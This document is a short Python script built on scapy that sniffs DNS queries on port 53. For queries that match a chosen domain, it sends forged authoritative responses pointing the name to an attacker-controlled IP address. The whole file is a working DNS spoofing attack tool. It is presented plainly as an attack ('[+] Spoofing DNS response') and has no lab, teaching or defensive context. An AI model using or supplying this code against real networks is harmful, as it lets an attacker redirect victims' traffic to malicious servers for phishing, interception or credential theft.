from scapy.all import *

TARGET_DOMAIN = ""
ATTACKER_IP = ""

def dns_response(packet):
    global TARGET_DOMAIN, ATTACKER_IP

    # Check if packet is DNS query and not response
    if packet.haslayer(DNS) and packet[DNS].qr == 0:
        qname = packet[DNSQR].qname.decode('utf-8')

        # Check if domain matches target
        if TARGET_DOMAIN in qname:
            print(f"[+] Spoofing DNS response for {qname}")

            # Create spoofed DNS response
            spoofed_packet = IP(src=packet[IP].dst, dst=packet[IP].src) / \
                          UDP(sport=packet[UDP].dport, dport=packet[UDP].sport) / \
                          DNS(id=packet[DNS].id,          
                              qr=1,                       
                              aa=1,                       
                              rd=1,                       
                              qd=packet[DNS].qd,          
                              an=DNSRR(rrname=qname,     
                                       ttl=10, 
                                       rdata=ATTACKER_IP))    
            
            send(spoofed_packet, verbose=False)

def start_dns_spoof(target_domain_arg, attacker_ip_arg):
    global TARGET_DOMAIN, ATTACKER_IP
    TARGET_DOMAIN = target_domain_arg
    ATTACKER_IP = attacker_ip_arg

    print(f"[+] Starting DNS spoofing for domain: {TARGET_DOMAIN}")
    sniff(filter="udp port 53", prn=dns_response, store=0)